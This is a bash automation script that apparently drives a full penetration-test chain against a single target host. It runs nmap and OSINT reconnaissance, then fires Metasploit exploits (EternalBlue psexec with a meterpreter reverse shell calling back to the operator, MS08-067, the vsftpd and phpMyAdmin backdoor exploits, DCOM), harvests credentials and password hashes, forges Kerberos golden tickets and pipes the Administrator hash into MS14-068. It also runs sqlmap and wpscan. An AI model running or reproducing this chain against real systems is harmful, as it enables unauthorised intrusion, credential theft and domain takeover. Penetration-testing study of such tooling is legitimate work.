...
msfconsole -x "workspace -a "$WORKSPACE"; exit;" > $LOG_DIR/msfworkspace.log # 2>&1  
...
echo -e "${RED}"
nmap -Pn -p- -v -sSV --open --script=vuln $TARGET -oX $LOG_DIR/$TARGET.nmap_tcp.xml -oG $LOG_DIR/$TARGET.portsTCP.gnmap > $LOG/$CUSTOMER/nmaptcp.log # 2>&1
msfconsole -x "workspace $WORKSPACE; db_import $LOG_DIR/$TARGET.nmap_tcp.xml; exit" 2>&1
cat $LOG/$CUSTOMER/nmaptcp.log
...
echo -e "${RED} - Please whait a moment - "
echo -e "${RED}"
nmap -Pn -sU -T4 -p $UDP_PORTS --open $TARGET -oX $LOG_DIR/$TARGET.nmap_udp.xml -oG $LOG_DIR/$TARGET.portsUDP.gnmap > $LOG/$CUSTOMER/nmapudp.log 2>&1 > $LOG/$CUSTOMER/nmapudp.log # 2>&1 
msfconsole -x "workspace $WORKSPACE; db_import $LOG_DIR/$TARGET.nmap_udp.xml; exit" 2>&1
cat $LOG/$CUSTOMER/nmapudp.log
...
msfconsole -x "spool $LOG_DIR/$TARGET.msf.log; workspace $WORKSPACE; use exploit/windows/smb/ms17_010_psexec; setg RHOST $TARGET; setg RHOSTS $TARGET; setg LHOST $localIP; set LPORT 17010; set PAYLOAD windows/x64/meterpreter/reverse_tcp; show options; run -z; use post/windows/gather/credentials/sso; set SESSION 1; show options; run -z; use post/windows/gather/smart_hashdump; set SESSION 1; show options; run -z; use post/windows/escalate/golden_ticket; set SESSION 1; show options; run -z; use post/windows/gather/enum_domain; set SESSION 1; run -z;" 
  ...
  read -n 1 -s
##
msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; creds -u Administrator -o "$LOG/$CUSTOMER/creds.log"; exit -y;" 
USER=$(cat $LOG/$CUSTOMER/creds.log | grep -w "$TARGET" | awk 'BEGIN{FS="[|,:]"} ; {print $4}' | sed 's/"//' | sed 's/.$//' | grep -w "Administrator")
HASH=$(cat $LOG/$CUSTOMER/creds.log | grep -w "$TARGET" | grep -w "Administrator" | awk 'BEGIN{FS="[|,]"} ; {print $5,$6}' | sed 's/"//g')
#
...
##
msfconsole -x "spool "$LOG_DIR/$TARGET.msf.log"; workspace "$WORKSPACE"; services -s smb -S domain -o '$LOG/$CUSTOMER/domain.txt'; exit -y;" 
#
DOMAIN=$(cat $LOG/$CUSTOMER/domain.txt | awk 'BEGIN{FS="[|,:]"} ; {print $9}' | sed 's/"//' | sed 's/.$//')
DOMAIN=$DOMAIN.LOCAL
#
echo $DOMAIN
echo $USER
...
msfconsole -x "spool $LOG_DIR/$TARGET.msf.log; workspace $WORKSPACE; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; set RHOST $TARGET; set DOMAIN DARKSH3LL.LOCAL; set PASSWORD $HASH; set USER $USER; set USER_SID 500; run -z;"
echo "press any key to continue"
read -n 1 -s
...
echo -e "${GREEN}====================================================================================${RESET}"
#brutex $TARGET > $LOG/$CUSTOMER/$TARGET.brutex.log # 2>&1 
cat $LOG/$CUSTOMER/$TARGET.brutex.log | grep -w 'opened...'
cat $LOG/$CUSTOMER/$TARGET.brutex.log | grep -w 'attacking'
cat $LOG/$CUSTOMER/$TARGET.brutex.log | grep -w 'valid passwords found'
#
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED RUNNING NSLOOKUP ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
nslookup $TARGET > $LOG_DIR/$TARGET.dns.txt # 2>&1
cat $LOG_DIR/$TARGET.dns.txt
host $TARGET > $LOG_DIR/$TARGET.host.txt 2>&1
cat $LOG_DIR/$TARGET.host.txt
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED GATHERING WHOIS INFO ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
whois $TARGET > $LOG_DIR/$TARGET.whois.txt # 2>&1
cat $LOG_DIR/$TARGET.whois.txt | grep -v whois
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED GATHERING OSINT INFO ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
theharvester -d $TARGET -l 500 -b all -v -n -c -t -h -f $LOG_DIR/$TARGET.theharvester.html > $LOG_DIR/$TARGET.osint.txt # 2>&1
cat $LOG_DIR/$TARGET.osint.txt
metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOG_DIR -f $LOG_DIR/$TARGET.metagoofil.txt # 2>&1
cat $LOG_DIR/$TARGET.metagoofil.txt | grep -v Metagoofil | grep -h html
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED GATHERING DNS INFO ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$ORANGE"
dig -x $TARGET > $LOG_DIR/$TARGET.dig.txt # 2>&1
cat $LOG_DIR/$TARGET.dig.txt | grep -v DiG
dnsenum $TARGET > $LOG_DIR/$TARGET.dnsenum..txt # 2>&1
...
#
echo -e "${GREEN}============================================================================${RESET}"
echo -e "$RED Start automated pentesting now! ${RESET}"
echo -e "${GREEN}=============================================================================${RESET}"
#
if [ -z "$ms08067" ];
then
  ...
  msfconsole -x "spool "$LOG_DIR/$TARGET.ms08067.log"; workspace "$WORKSPACE"; use exploit/windows/smb/ms08_067_netapi; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; show options; run -z; exit -y;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn -sC -p 21 --script=ftp-* $TARGET -oX $LOG_DIR/$TARGET.nmap_ftp.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "workspace $WORKSPACE; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log # 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn -sC  -p 22 --script=ssh-* $TARGET -oX $LOG_DIR/$TARGET.nmap_ssh22.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET";setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RPORT 65022; setg RPORTS 65022; setg RHOSTS "$TARGET";setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=telnet* -p 23 $TARGET -oX $LOG_DIR/$TARGET.telnet.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version;run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1 
fi
...
then
  ...
  msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=dns* -p 53 $TARGET -oX $LOG_DIR/$TARGET.dns.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sU -sV -Pn  --script=dhcp* -p 67 $TARGET -oX $LOG_DIR/$TARGET.dhcp.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sU -sV -Pn  --script=dhcp* -p 68 $TARGET -oX $LOG_DIR/$TARGET.dhcp2.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sU -sV -Pn  --script=tftp* -p 69 $TARGET -oX $LOG_DIR/$TARGET.tftp.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=finger* -p 79 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  bin/fingertool.sh $TARGET $USER_FILE > $LOG/$CUSTOMER/finger.log 2>&1
fi
...
echo -e "$RED PORT 80 open, running Test"
   ...
   echo -e "${GREEN}====================================================================================${RESET}"
    python $TOOL_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOG_DIR/$TARGET.sublistertxt 2>&1
    dos2unix $LOG_DIR/domains/domains-$TARGET.txt 2>/dev/null > $LOG_DIR/$TARGET.dos2unix.txt 2>&1
   echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$ORANGE + -- --=[Port 80 opened... running tests...${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING FOR WAF ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    wafw00f http://$TARGET > $LOG_DIR/$TARGET.wafw00f80.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED GATHERING HTTP INFO ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    whatweb http://$TARGET > $LOG_DIR/$TARGET.whatweb.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS AND METHODS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    xsstracer $TARGET 80 > $LOG_DIR/$TARGET.xsstracer.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    curl --connect-timeout 1 -I -s -R http://$TARGET > $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-Content' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-Frame' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-XSS' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking HTTP methods on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X OPTIONS http://$TARGET:$PORT | grep Allow | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X TRACE http://$TARGET:$PORT | grep TRACE | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for META tags on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT | egrep -i meta --color=auto | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for open proxy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -x http://$TARGET:$PORT -L http://google.com | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Enumerating software on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Strict-Transport-Security" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/crossdomain.xml | tail -n 10 >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/clientaccesspolicy.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Access-Control-Allow-Origin" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Retrieving robots.txt on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/robots.txt | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Retrieving sitemap.xml on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/sitemap.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking cookie attributes on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:$PORT | egrep -i "Cookie:" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:$PORT/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    curl -s --insecure http://$TARGET:$PORT/test.aspx -L | egrep -i 'Error|Exception|System.Web.'  >> $LOG_DIR/$TARGET.headers-http.txt 2>&1
    ##echo -e "${GREEN}===========================================================================${RESET}"
    ##echo -e "$RED SAVING SCREENSHOTS - Create Directory $LOG_DIR ${RESET}"
    ##echo -e "${GREEN}===========================================================================${RESET}"
    ##cutycapt --url=http://$TARGET --out=$LOG_DIR/$TARGET-port80.jpg 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto$PORT.xml 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING SQLMAP SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    sqlmap -u "http://$TARGET:$PORT" --batch --crawl=5 --level 1 --risk 1 -f -a 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING PHPMYADMIN METASPLOIT EXPLOIT ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT $PORT; show options; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WORDPRESS VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET --batch --disable-tls-checks > $LOG_DIR/$TARGET.wpscan.txt 2>&1
    wpscan --url http://$TARGET/wp-admin/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan.txt 2>&1 
    wpscan --url http://$TARGET/wordpress/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan.txt 2>&1
    wpscan --url http://$TARGET/blog/wp-login.php --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan.txt 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING CMSMAP ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $CMSMAP -t https://$TARGET > $LOG_DIR/$TARGET.cmsmap.txt 2>&1
    python $CMSMAP -t https://$TARGET/wordpress/ >> $LOG_DIR/$TARGET.cmsmap.txt 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING JEXBOSS ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:80 -out $LOG_DIR/$TARGET.jexboss80.log 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED ENUMERATING WEB SOFTWARE ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    clusterd -i $TARGET > $LOG_DIR/$TARGET.clusterd.txt 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* http://$TARGET:80 > test.arachni.log 2>&1
    arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_80.xml 2>&1 
fi
...
if [ -z "$port_88" ];
  then
   ...
   echo -e "$RED GATHERING DNS SUBDOMAINS ${RESET}"
   echo -e "${GREEN}====================================================================================${RESET}"
   python $TOOL_DIR/Sublist3r/sublist3r.py -d $TARGET -p 88 -vvv -o $LOG_DIR/$TARGET.sublister88.txt 2>&1
   dos2unix $LOG_DIR/domains/domains-$TARGET.txt 2>/dev/null > $LOG_DIR/$TARGET.dos2unix88.txt 2>&1l
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$ORANGE + -- --=[Port 88 opened... running tests...${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING FOR WAF ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    wafw00f http://$TARGET:88 > $LOG_DIR/$TARGET.wafw00f88.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED GATHERING HTTP INFO ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
   whatweb http://$TARGET:88 > $LOG_DIR/$TARGET.whatweb88.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS AND METHODS ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    xsstracer $TARGET 88 > $LOG_DIR/$TARGET.xsstracer88.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED CHECKING HTTP HEADERS "http://$TARGET:88" ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    curl --connect-timeout 1 -I -s -R http://$TARGET:88 > $LOG_DIR/$TARGET.headers-http.88.txt 2>&1
    curl -s --insecure -I http://$TARGET:88 | egrep -i 'X-Content' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i 'X-Frame' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i 'X-XSS' | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking HTTP methods on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X OPTIONS http://$TARGET:88 | grep Allow | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I -X TRACE http://$TARGET:88 | grep TRACE | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for META tags on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88 | egrep -i meta --color=auto | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for open proxy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -x http://$TARGET:88 -L http://google.com | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Enumerating software on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Strict-Transport-Security" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/crossdomain.xml | tail -n 10 >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/clientaccesspolicy.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Access-Control-Allow-Origin" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Retrieving robots.txt on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/robots.txt | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Retrieving sitemap.xml on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/sitemap.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking cookie attributes on $TARGET...${RESET} $ORANGE"
    curl -s --insecure -I http://$TARGET:88 | egrep -i "Cookie:" | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "$BLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...${RESET} $ORANGE"
    curl -s --insecure http://$TARGET:88/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    curl -s --insecure http://$TARGET:88/test.aspx -L | egrep -i 'Error|Exception|System.Web.'  >> $LOG_DIR/$TARGET.headers-http88.txt 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    #echo -e "$RED SAVING SCREENSHOTS - Create Directory $LOG_DIR ${RESET}"
    #echo -e "${GREEN}===========================================================================${RESET}"
    #cutycapt --url=http://$TARGET:88 --out=$LOG_DIR/$TARGET-port88.jpg 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    nikto -h http://$TARGET:88 -Format xml -o $LOG_DIR/$TARGET.nikto88.xml 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING SQLMAP SCAN ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    sqlmap -u "http://$TARGET:88" --batch --crawl=5 --level 1 --risk 1 -f -a 2>&1
    echo -e "${GREEN}===========================================================================${RESET}"
    echo -e "$RED RUNNING PHPMYADMIN METASPLOIT EXPLOIT ${RESET}"
    echo -e "${GREEN}===========================================================================${RESET}"
    msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "88"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WORDPRESS VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET:88 --batch --disable-tls-checks > $LOG_DIR/$TARGET.wpscan88.txt 2>&1
    wpscan --url http://$TARGET:88/wp-admin/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan88.txt 2>&1
    wpscan --url http://$TARGET:88/wordpress/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan88.txt 2>&1
    wpscan --url http://$TARGET:88/blog/wp-login.php --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscan88.txt 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING CMSMAP ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $CMSMAP -t https://$TARGET:88 > $LOG_DIR/$TARGET.cmsmap88.txt 2>&1
    echo ""
    python $CMSMAP -t https://$TARGET:88/wordpress/ >> $LOG_DIR/$TARGET.cmsmap88.txt 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING JEXBOSS ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:88 -out $LOG_DIR/$TARGET.jexboss88.log 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED ENUMERATING WEB SOFTWARE ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    clusterd -i $TARGET -p 88 > $LOG_DIR/$TARGET.clusterd88.txt 2>&1
    echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* http://$TARGET:88 > test.arachni.log 2>&1
    arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_88.xml 2>&1
...
then
  ...
  nmap -A -sV   --script=pop* -p 110 $TARGET -oX $LOG_DIR/$TARGET.pop3.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  showmount -a $TARGET > $LOG_DIR/$TARGET.showmount.txt 2>&1
  showmount -d $TARGET >> $LOG_DIR/$TARGET.showmount.txt 2>&1
  showmount -e $TARGET >> $LOG_DIR/$TARGET.showmount.txt 2>&1
  echo -e "$RED #####################################################"
...
then
  ...
  nmap -A -sU -sV -Pn  --script=ntp-* -p 68 $TARGET -oX $LOG_DIR/$TARGET.ntp.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  echo -e "$RED #####################################################"
...
then
  ...
  rpcinfo -p $TARGET > $LOG_DIR/$TARGET.rpcinfo.txt 2>&1
  nmap -A -p 135  --script=rpc* $TARGET -oX $LOG_DIR/$TARGET.rpc.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "workspace "$WORKSPACE"; set RHOST "$TARGET"; use windows/dcerpc/ms03_026_dcom; show options; run -z; exit -y; exit;" ## >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  echo -e "$ORANGE ##############################################################"
...
then
  ...
  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET -oX $LOG_DIR/$TARGET.port162.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use auxiliary/scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; show options; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  echo -e "$RED #################################${RESET}"
...
then
  ...
  nmap -A -p 389 -Pn  --script=ldap* $TARGET -oX $LOG_DIR/$TARGET.port389.xml  >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  echo -e "$RED #####################################${RESET}"
...
then
  ...
  echo -e "$RED CHECKING FOR WAF ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  wafw00f https://$TARGET > $LOG_DIR/$TARGET.wafw00f443.txt 2>&1
  echo ""
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED GATHERING HTTP INFO ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  whatweb https://$TARGET > $LOG_DIR/$TARGET.whatweb.txt 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED CHECKING HTTP HEADERS AND METHODS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  xsstracer $TARGET 443 > $LOG_DIR/$TARGET.xsstracer.txt 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED CHECKING HTTP HEADERS ${RESET}"
